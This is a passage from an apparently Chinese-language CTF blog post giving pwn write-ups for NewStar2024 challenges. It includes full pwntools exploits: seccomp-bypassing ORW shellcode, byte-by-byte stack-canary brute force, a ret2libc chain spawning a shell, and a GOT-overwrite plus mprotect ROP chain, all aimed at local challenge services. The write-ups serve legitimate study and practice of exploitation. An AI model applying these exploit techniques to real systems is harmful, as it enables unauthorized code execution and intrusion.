+<p>可以使用 <code>preadv2</code> (327) 代替read</p>
+<p>可以使用 <code>writev</code> (20) 代替 wirte</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>from pwn import *<br><br>context(log_level=&#x27;info&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br><br><br>p = remote(&#x27;127.0.0.1&#x27;, 37027) <br><br>shellcode = &#x27;&#x27;&#x27;<br>    /* 设置栈指针到安全区域 */<br>    mov rsp, 0x4040c0<br>&#x27;&#x27;&#x27;<br><br># 使用 openat 打开 flag 文件<br>shellcode += shellcraft.openat(-100, &quot;/flag&quot;, 0, 0)<br><br># 使用 sendfile 将内容从文件描述符3传输到stdout<br>shellcode += shellcraft.sendfile(1, 3, 0, 0x100)<br><br><br>payload = asm(shellcode)<br>p.sendlineafter(b&#x27;Welcome to Shellcode World!&#x27;, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762670165559-5882fa9e-7bb1-43bb-acb0-8f4dca79066a.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<h3 id="summary-1"><a href="#summary-1" class="headerlink" title="summary"></a>summary</h3><p>小小sandbox,不过如此</p>
+<h2 id="【pwn】newstar2024-ezcanary"><a href="#【pwn】newstar2024-ezcanary" class="headerlink" title="【pwn】newstar2024 ezcanary"></a>【pwn】newstar2024 ezcanary</h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>出题人曰：我开了那么多保护，一定很安全吧 ~</p>
+<p>可能是绕过 Canary 保护方面的</p>
+<p>卸甲！！！</p>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>经典看看盾</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762671171906-4e73685a-8a6a-47ea-af2e-13b7e22b22ed.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>1) 没有开启PIE（地址固定）</strong> 和 <strong>2) 没有被Stripped（保留了符号）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">text:0000000000401236 ; __unwind &#123;<br>.text:0000000000401236                 endbr64<br>.text:000000000040123A                 push    rbp<br>.text:000000000040123B                 mov     rbp, rsp<br>.text:000000000040123E                 sub     rsp, 10h<br>.text:0000000000401242                 mov     rax, fs:28h<br>.text:000000000040124B                 mov     [rbp+var_8], rax<br>.text:000000000040124F                 xor     eax, eax<br>.text:0000000000401251                 lea     rdi, command    ; &quot;/bin/sh&quot;<br>.text:0000000000401258                 call    _system<br>.text:000000000040125D                 nop<br>.text:000000000040125E                 mov     rax, [rbp+var_8]<br>.text:0000000000401262                 xor     rax, fs:28h<br>.text:000000000040126B                 jz      short locret_401272<br>.text:000000000040126D                 call    ___stack_chk_fail<br>.text:0000000000401272 ; ---------------------------------------------------------------------------<br>.text:0000000000401272<br>.text:0000000000401272 locret_401272:                          ; CODE XREF: getshell+35↑j<br>.text:0000000000401272                 leave<br>.text:0000000000401273                 retn<br>.text:0000000000401273 ; &#125; // starts at 401236<br>.text:0000000000401273 getshell        endp<br></code></pre></td></tr></table></figure>
+
+<p>有后门函数getshell</p>
+<p><strong>IDA启动</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762671537367-de911630-6a13-4dc6-ac29-15289909e84b.png" srcset="/img/loading.gif" lazyload></p>
+<p>三个read经典栈溢出</p>
+<p>程序执行流程：</p>
+<ol>
+<li><strong>设置保护</strong>：初始化栈金丝雀</li>
+<li><strong>进入循环</strong>：<ul>
+<li><strong>子进程</strong>：显示提示 → 读取用户输入（存在溢出） → 退出</li>
+<li><strong>父进程</strong>：等待子进程结束 → 读取用户输入 → 检查是否为<code>&quot;cat flag\n&quot;</code></li>
+</ul>
+</li>
+<li><strong>退出条件</strong>：只有当父进程收到<code>&quot;cat flag\n&quot;</code>时才退出循环</li>
+<li><strong>最终输出</strong>：打印<code>&quot;flag is one_by_one_bruteforce&quot;</code></li>
+</ol>
+<p><strong>设计的目的：</strong></p>
+<ol>
+<li><strong>制造一个“沙盒”环境</strong>：子进程成为了一个可以随意搞破坏的“试验场”。</li>
+<li><strong>利用独立性</strong>：<ul>
+<li>在子进程中进行<strong>栈溢出攻击</strong>，可能会破坏栈上的金丝雀值，导致子进程崩溃</li>
+<li>但由于父子进程内存独立，<strong>父进程中的金丝雀值依然是完好的</strong></li>
+<li>子进程崩溃后，父进程通过 <code>wait(0)</code> 回收它，然后<strong>继续正常运行</strong>，进入下一次循环</li>
+</ul>
+</li>
+<li><strong>为暴力破解创造条件</strong>：因为子进程每次都是“全新”的，并且崩溃了也没关系，攻击者可以一次又一次地尝试，比如一字节一字节地猜测金丝雀的值，直到子进程不崩溃，就意味着猜对了（用来<strong>隔离漏洞利用的副作用</strong>，使得攻击者可以在子进程中安全地进行试探和暴力破解，而不会影响主程序的稳定运行）</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762879263811-b355deef-bc0f-48bb-9cdf-28684ab34fc8.png" srcset="/img/loading.gif" lazyload></p>
+<p>好吧，出了点小问题</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762962374892-c2c25f39-514d-4832-87bf-15d7d5436adf.png" srcset="/img/loading.gif" lazyload></p>
+<p>本地测试通过了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1762962396351-6ac5a230-4b7e-4310-9d5d-6f7832335fc6.png" srcset="/img/loading.gif" lazyload></p>
+<p>切换到远程就变成这样了</p>
+<h3 id="方案：-1"><a href="#方案：-1" class="headerlink" title="方案："></a>方案：</h3><p>爆破就对了</p>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plain">#_*_ coding:utf-8 _*_<br>from pwn import *<br><br>elf = ELF(&quot;./ezcanary&quot;)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = &#x27;debug&#x27;<br>#p = process([elf.path])<br>p = remote(&#x27;127.0.0.1&#x27;,40745)<br><br># 直接爆破canary<br>can = b&#x27;\x00&#x27;<br>for i in range(7):<br>    for j in range(256):<br>        time.sleep(0.1)<br>        payload1 = (0x60-8) * b&#x27;a&#x27; + can + p8(j)<br>        p.sendafter(&#x27;你觉得呢？\n&#x27;, payload1)<br>        info = p.recvuntil(&#x27;\n&#x27;)<br>        if b&quot;*** stack smashing detected ***&quot; in info:<br>            p.send(&#x27;n\n&#x27;)<br>            continue<br>        else:<br>            can += p8(j)<br>            break<br>    if i != 6:<br>        p.send(&#x27;a\n&#x27;)<br>    else:<br>        p.sendline(&#x27;cat flag&#x27;)<br><br>canary = u64(can)<br>print(f&quot;Canary: &#123;hex(canary)&#125;&quot;)<br><br>getshell = 0x401251<br>payload2 = b&quot;a&quot; * (0x60-8) + p64(canary) + p64(0) + p64(getshell)<br>p.sendafter(&quot;bruteforce\n&quot;, payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>本地运行没问题，远程环境就卡在第4个bt爆不出来</p>
+<p>gdb调试一下</p>
+<h3 id="summary-2"><a href="#summary-2" class="headerlink" title="summary"></a>summary</h3><p>就是靶场的问题</p>
+<h2 id="【pwn】newstar2024-ez-game"><a href="#【pwn】newstar2024-ez-game" class="headerlink" title="【pwn】newstar2024 ez_game"></a>【pwn】newstar2024 ez_game</h2><p>之前写过了，现在把md文件中的内容总结到语雀里</p>
+<h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><p>ret2libc</p>
+<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>经典看看护盾😋</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763019426890-954394d5-9533-439e-a74b-5398ef19901d.png" srcset="/img/loading.gif" lazyload></p>
+<p>出题人曰：没有了后门也能打通吧</p>
+<p>ida启动</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763019555642-428ffcd9-b0d9-4fd1-8d19-578e99887fa0.png" srcset="/img/loading.gif" lazyload></p>
+<p>确实没有后门</p>
+<p>方案：</p>
+<ol>
+<li>第一次溢出泄露 libc 地址</li>
+<li>计算 system 和 &#x2F;bin&#x2F;sh 的真实地址</li>
+<li>第二次溢出执行 system(“&#x2F;bin&#x2F;sh”) 获取 shell</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763274441832-d3615a7c-d0a1-484e-80fc-9c04f47c7cac.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763274450005-d4772d45-8628-44b8-8c95-f27f5c715bc4.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763274458381-0a880252-9e38-4def-9796-9597d4255010.png" srcset="/img/loading.gif" lazyload></p>
+<p>信息搜集</p>
+<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><br>flag = 0<br>if flag == 1:<br>    p = remote(&#x27;127.0.0.1&#x27;, 34083)<br>else:<br>    p = process(&#x27;./attachment&#x27;)<br><br>elf = ELF(&#x27;./attachment&#x27;)<br>libc = ELF(&quot;./libc-2.31.so&quot;)<br><br># 获取必要的地址<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>main_addr = 0x400686<br>pop_rdi = 0x400783<br>ret_addr = 0x400509<br><br># 第一次溢出：泄露 puts 地址<br>payload = b&#x27;a&#x27; * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.recvuntil(b&#x27;Welcome to NewStarCTF!!!!\n&#x27;)<br>p.send(payload)<br><br># 接收泄露的地址<br>p.recvuntil(b&#x27;Try again!!\n&#x27;)<br>puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))<br>log.info(f&quot;Leaked puts address: &#123;hex(puts_addr)&#125;&quot;)<br><br># 计算 libc 基地址<br>libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><br>log.info(f&quot;Libc base: &#123;hex(libc_base)&#125;&quot;)<br>log.info(f&quot;System address: &#123;hex(system_addr)&#125;&quot;)<br>log.info(f&quot;/bin/sh address: &#123;hex(binsh_addr)&#125;&quot;)<br><br># 第二次溢出：调用 system(&quot;/bin/sh&quot;)<br>payload = b&#x27;a&#x27; * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)<br>p.recvuntil(b&#x27;Welcome to NewStarCTF!!!!\n&#x27;)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763274841580-dd7de2b0-22f7-44fd-b89c-2589d937da33.png" srcset="/img/loading.gif" lazyload></p>
+<p>？？？，怎么回事</p>
+<p>可能是地址出错了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><br>flag = 1<br>if flag == 1:<br>    p = remote(&#x27;127.0.0.1&#x27;, 34803)<br>else:<br>    p = process(&#x27;./attachment&#x27;)<br><br>elf = ELF(&#x27;./attachment&#x27;)<br>libc = ELF(&quot;./libc-2.31.so&quot;)<br><br># 获取必要的地址<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>main_addr = elf.symbols[&#x27;main&#x27;]<br>pop_rdi = 0x400783<br>ret_addr = 0x400509<br><br># 第一次溢出：泄露 puts 地址<br>payload = b&#x27;a&#x27; * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.recvuntil(b&#x27;Welcome to NewStarCTF!!!!\n&#x27;)<br>p.send(payload)<br><br># 接收泄露的地址<br>p.recvuntil(b&#x27;Try again!!\n&#x27;)<br>puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))<br>log.info(f&quot;Leaked puts address: &#123;hex(puts_addr)&#125;&quot;)<br><br># 计算 libc 基地址<br>libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br><br>log.info(f&quot;Libc base: &#123;hex(libc_base)&#125;&quot;)<br>log.info(f&quot;System address: &#123;hex(system_addr)&#125;&quot;)<br>log.info(f&quot;/bin/sh address: &#123;hex(binsh_addr)&#125;&quot;)<br><br># 第二次溢出：调用 system(&quot;/bin/sh&quot;)<br>payload = b&#x27;a&#x27; * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)<br>#p.recvuntil(b&#x27;Welcome to NewStarCTF!!!!\n&#x27;)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763275992704-356452af-d6df-4c64-a90e-1a52c7cbbf28.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="第二次溢出：调用-system-“-bin-sh”"><a href="#第二次溢出：调用-system-“-bin-sh”" class="headerlink" title="第二次溢出：调用 system(“&#x2F;bin&#x2F;sh”)"></a>第二次溢出：调用 system(“&#x2F;bin&#x2F;sh”)</h1><p>payload &#x3D; b’a’ * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr)</p>
+<p>#p.recvuntil(b’Welcome to NewStarCTF!!!!\n’)</p>
+<p>p.send(payload)</p>
+<p>第二次溢出中就不需要这个了‘p.recvuntil(b’Welcome to NewStarCTF!!!!\n’)’</p>
+<p>success</p>
+<h3 id="summary-3"><a href="#summary-3" class="headerlink" title="summary"></a>summary</h3><p>出题人和AI都不要信</p>
+<h2 id="【pwn】newstar2024-One-Last-B1te"><a href="#【pwn】newstar2024-One-Last-B1te" class="headerlink" title="【pwn】newstar2024 One Last B1te"></a>【pwn】newstar2024 One Last B1te</h2><h3 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h3><p>发现了sandbox和libc</p>
+<p>GOT覆盖攻击？</p>
+<p>出题人曰：3, 2, 1, GOT 1t !</p>
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>题目给了三个文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763277726780-83c38e0d-03c4-4043-bf8b-81fb0b2d250e.png" srcset="/img/loading.gif" lazyload></p>
+<p>经典看看护盾😋</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763278391615-c4cab259-b777-489c-974c-86699301aa16.png" srcset="/img/loading.gif" lazyload></p>
+<p>RELRO (Relocation Read-Only)</p>
+<p>部分RELRO保护，GOT表可写，存在GOT覆盖攻击的风险</p>
+<ul>
+<li><strong>Partial RELRO</strong>: GOT表仍可写，可通过漏洞覆盖GOT条目劫持控制流</li>
+<li><strong>Full RELRO</strong>: GOT表完全只读，但会增加程序启动时间</li>
+</ul>
+<p><strong>没有栈保护，易发生栈溢出</strong></p>
+<hr>
+<p><strong>数据段不可执行，防止在栈或堆上执行shellcode</strong></p>
+<hr>
+<p><strong>代码段地址固定，rop启动</strong></p>
+<hr>
+<p><strong>SHSTK (Shadow Stack)</strong></p>
+<p><strong>影子栈保护，用于控制流完整性</strong></p>
+<hr>
+<p><strong>IBT (Indirect Branch Tracking)</strong></p>
+<p><strong>间接分支跟踪，防止JOP&#x2F;COP攻击</strong></p>
+<p><strong>（</strong></p>
+<ul>
+<li><strong>ROP</strong><strong>: 利用已有的代码片段(gadget)构造攻击链</strong></li>
+<li><strong>JOP&#x2F;COP: 跳转导向&#x2F;调用导向编程）</strong></li>
+</ul>
+<hr>
+<p><strong>Stripped</strong></p>
+<p><strong>符号表未剥离，便于调试和分析</strong></p>
+<hr>
+<p><strong>总结：</strong></p>
+<p><strong>可利用</strong>:</p>
+<ul>
+<li>❌** 无栈金丝雀 → 直接栈溢出**</li>
+<li>❌** 无PIE → 固定地址易于计算**</li>
+<li>⚠️** 部分RELRO → GOT可覆盖**</li>
+</ul>
+<p><strong>开的盾:</strong></p>
+<ul>
+<li>✅** NX → 不能执行shellcode**</li>
+<li>✅** SHSTK → 返回地址保护**</li>
+<li>✅** IBT → 间接跳转保护**</li>
+</ul>
+<p><strong>存在延迟绑定 + GOT 表可写</strong></p>
+<p><strong>看看sandbox</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763286436677-88b57f85-1f0b-4701-8953-5d13a07a0fc5.png" srcset="/img/loading.gif" lazyload></p>
+<p> 0005: 0x15 0x03 0x00 0x00000028  if (A &#x3D;&#x3D; sendfile) goto 0009</p>
+<p> 0006: 0x15 0x02 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0009</p>
+<p> 0007: 0x15 0x01 0x00 0x00000142  if (A &#x3D;&#x3D; execveat) goto 0009</p>
+<p>这三个寄掉了qwq</p>
+<p> 0001: 0x15 0x00 0x07 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0009</p>
+<p>确保只在 x86_64 架构上运行</p>
+<p>0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</p>
+<p>将当前系统调用号加载到累加器 A</p>
+<ul>
+<li><code>0x00000000</code> &#x3D; 偏移量，获取系统调用号</li>
+</ul>
+<p>0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</p>
+<p>0004: 0x15 0x00 0x04 0xffffffff  if (A !&#x3D; 0xffffffff) goto 0009</p>
+<p>如果系统调用号 &lt; 0x40000000，跳转到 0005</p>
+<p>如果系统调用号 ≠ -1 (0xffffffff)，跳转到 0009 (KILL)</p>
+<p><strong>作用</strong>: 只允许普通系统调用或特殊的 -1 值</p>
+<p>0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</p>
+<p><strong>作用</strong>: 允许所有其他系统调用</p>
+<p>看样子可以试试<strong>ORW (Open-Read-Write) 攻击</strong></p>
+<p>IDA启动</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763279365978-4a63e104-4ccc-4149-9655-c248b4faac4b.png" srcset="/img/loading.gif" lazyload></p>
+<ol>
+<li><strong>栈溢出</strong>: <code>read(0, v5, 0x110u)</code> 写入0x110字节到仅16字节的<code>v5</code>数组，可覆盖返回地址。</li>
+<li><strong>任意地址写</strong>: 通过<code>read(0, &amp;buf, 8u)</code>控制<code>buf</code>指针，然后<code>read(0, buf, 1u)</code>向指定地址写入一个字节。</li>
+<li><strong>seccomp规则</strong>: 禁止<code>execve</code>和<code>execveat</code>，但允许其他系统调用（如open、read、write）。</li>
+<li><strong>保护机制</strong>: 无PIE（地址固定）、无栈金丝雀，但启用了SHSTK和IBT，因此ROP链需跳转到以<code>endbr64</code>开头的地址。</li>
+</ol>
+<p>看看libc版本</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1763362618240-f801c6e7-bcea-4572-9069-a4a6d28d897f.png" srcset="/img/loading.gif" lazyload></p>
+<p>2.39</p>
+<p>版本有点新</p>
+<p>（ok，补了一些关于plt 和got表的知识，原理理解了）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1764083254650-2d167794-1e54-4b16-8910-1c177870b1b5.png" srcset="/img/loading.gif" lazyload></p>
+<p>层层传输说是</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1764052763376-30943230-9a2a-403f-878c-0e507a527746.png" srcset="/img/loading.gif" lazyload></p>
+<p>小小的gdb调试</p>
+<p>然后用ROPgadget找找gadgets,</p>
+<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>from pwn import*<br><br>context.log_level=&#x27;debug&#x27;<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]<br> <br>ELFpath = &#x27;./pwn&#x27;<br>p=remote(&#x27;localhost&#x27;,44791)<br><br> <br>close_got=0x404028<br>write_plt=0x4010c0<br> <br>p.sendafter(&quot;Show me your UN-Lucky number :&quot;,p64(close_got))<br>p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;,b&#x27;\xc0&#x27;)<br>ret=0x0401447<br>main=0x4013a3<br>rubbish=0x404000+0x800<br>payload=b&#x27;a&#x27;*0x18+p64(ret)+p64(main)<br><br> <br>p.send(payload)<br>p.recvuntil(b&#x27;a&#x27;*0x18)<br>p.recv(0xb8-0x18)<br>libc_base=u64(p.recv(6)+b&#x27;\x00\x00&#x27;)-0x710b26c2a28b+0x710b26c00000<br> <br>p.sendafter(&quot;Show me your UN-Lucky number :&quot;,p64(rubbish))<br> <br>p.sendafter(&quot;Try to hack your UN-Lucky number with one byte :&quot;,b&#x27;\x70&#x27;)<br> <br>pop_rdi=libc_base+0x010f75b<br>pop_rsi=libc_base+0x110a4d<br>binsh=libc_base+0x1cb42f<br> <br>xchg_edx_eax=libc_base+0x01a7f27<br> <br>pop_rax=libc_base+0x0dd237<br> <br>open_a=libc_base+0x011B120<br>read_a=libc_base+0x011BA50<br>mprotect=libc_base+0x00125C10<br> <br>payload=b&#x27;a&#x27;*0x18+p64(pop_rdi)+p64(libc_base+0x202000)+p64(pop_rsi)+p64(0x2000)+p64(pop_rax)+p64(7)+p64(xchg_edx_eax)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(libc_base+0x202000)+p64(pop_rax)+p64(0x1000)+p64(xchg_edx_eax)+p64(read_a)+p64(libc_base+0x202000)<br> <br><br> <br>p.send(payload)<br> <br><br> <br>shellcode=&#x27;&#x27;<br>shellcode+=shellcraft.open(&#x27;./flag&#x27;,0,0)<br>shellcode+=shellcraft.read(&#x27;rax&#x27;,libc_base+0x202000+0x800,0x100)<br>shellcode+=shellcraft.write(2,libc_base+0x202000+0x800,&#x27;rax&#x27;)<br>p.send(asm(shellcode))<br> <br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/NewStar2024/1764674912365-20e27879-831a-48d1-a972-d4aac1b338b8.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<h3 id="summary-4"><a href="#summary-4" class="headerlink" title="summary"></a>summary</h3><p>接下来把之前的题复盘一遍</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NewStar2024</div>
+      <div>http://example.com/2026/04/22/NewStar2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
